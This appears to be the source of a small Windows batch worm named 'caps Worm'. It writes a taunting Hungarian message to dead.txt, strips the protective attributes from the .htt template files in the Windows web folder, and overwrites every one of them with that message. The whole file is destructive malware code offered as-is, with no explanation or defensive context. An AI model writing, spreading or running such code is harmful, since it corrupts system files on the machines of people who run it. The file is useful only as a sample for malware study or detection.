   @echo off
   @echo Im caps Worm! >dead.txt
   @echo Hát jól ráfaragtál az biztos! >>dead.txt
   @echo Ma ugyanis nincs kedvem dolgozni! >>dead.txt
   @echo Hagyj békén különben rá fogsz baszni! >>dead.txt
   @echo Próbáld meg talán holnap >>dead.txt
   :inf
   attrib %winbootdir%\web\*.htt -h -r -s
   for %%f in (%winbootdir%\web\*.htt) do copy dead.txt %%f >nul
